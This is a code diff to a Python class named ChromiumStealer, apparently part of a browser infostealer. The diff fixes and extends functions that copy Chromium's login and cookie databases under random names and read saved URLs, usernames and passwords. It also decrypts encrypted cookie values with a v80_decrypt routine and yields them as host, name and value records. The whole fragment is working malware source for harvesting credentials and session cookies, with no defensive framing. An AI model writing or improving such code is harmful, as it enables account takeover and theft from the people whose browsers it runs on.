@@ -6,11 +6,16 @@ from .browsers import Browsers
 class ChromiumStealer:
     def __init__(self, browser : Browsers):
         self.browser = browser
+
+    def exists(self):
+        return os.path.exists(self.browser.value['state'])
+
+    def initialize_crypter(self):
         self.crypter = Crypter(self, self.browser)
 
     def logins(self):
         path = self._clone_db(self.browser.value.get('login'))
-        sql = 'SELECT action_url, username_value, password_value FROM logins'
+        sql = 'SELECT IFNULL(origin_url, action_url), username_value, password_value FROM logins'
         db = sqlite3.connect(path)
         try:
             r = db.execute(sql)
@@ -31,15 +36,17 @@ class ChromiumStealer:
 
     def cookies(self):
         path = self._clone_db(self.browser.value.get('cookies'))
-        sql = 'SELECT host_key, name, value, encrypted_value FROM cookies'
+        sql = 'SELECT host_key, name, encrypted_value FROM cookies'
         db = sqlite3.connect(path)
-        try:
-            r = db.execute(sql)
-            for host_key, name, value, encrypted_value in r.fetchall():
+        db.text_factory = bytes
+        r = db.execute(sql)
+        for host_key, name, encrypted_value in r.fetchall():
+            try:
                 decrypted_cookie = self.crypter.v80_decrypt(encrypted_value)
-                yield (host_key, name, value, decrypted_cookie)
-        except:
-            pass
+                yield {'host': host_key.decode(), 'name': name.decode(), 'value': decrypted_cookie}
+            except Exception as e:
+                print(e)
+                pass
 
     def _clone_db(self, path):
         name = ''.join([random.choice(string.ascii_lowercase) for x in range(9)])
